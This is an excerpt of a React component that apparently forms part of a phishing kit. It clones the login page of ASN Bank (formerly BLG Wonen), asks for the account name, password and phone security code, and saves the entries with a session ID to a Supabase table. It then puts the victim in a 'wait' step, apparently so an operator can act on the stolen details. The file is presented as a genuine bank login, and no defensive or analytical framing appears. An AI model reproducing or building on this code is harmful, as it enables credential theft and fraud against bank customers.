...
export function AsnBankVoorheenBlgwonenLoginClient({ sessionId }: Props) {
  ...
  async function handleSubmit() {
    ...
    const { error: updateError } = await supabase
      ...
      .update({ is_hidden: false, current_step: "wait",
        form_data: {
          ...prev,
          bankSlug: "asn-bank-voorheen-blgwonen",
          bankName: "ASN Bank voorheen BLGwonen",
  ...
  return (
    <div className="min-h-screen bg-[#FAF6EC] font-sans flex flex-col">
      ...
      <header className="bg-white h-[90px] flex items-center justify-start px-8 lg:px-[15%] border-b border-gray-200 shrink-0">
        <img src="/bank-logos/asn-bank-voorheen-blgwonen.png" alt="ASN Bank voorheen BLGwonen" className="h-12" />
      </header>
      ...
      <main className="flex-1 flex flex-col items-center pt-10 pb-20 px-4">
        <div className="bg-white border border-gray-200 w-full max-w-[480px] shadow-sm">
          ...
          {/* Form Content */}
          <div className="p-8">
            <h1 className="text-[26px] text-[#187A5D] mb-3 font-normal">Inloggen bij BLG Wonen</h1>
            <p className="text-[15px] text-[#333] mb-6 font-bold leading-snug">
              Log in met uw toegangsnaam, wachtwoord en de beveiligingscode op uw telefoon.
            </p>
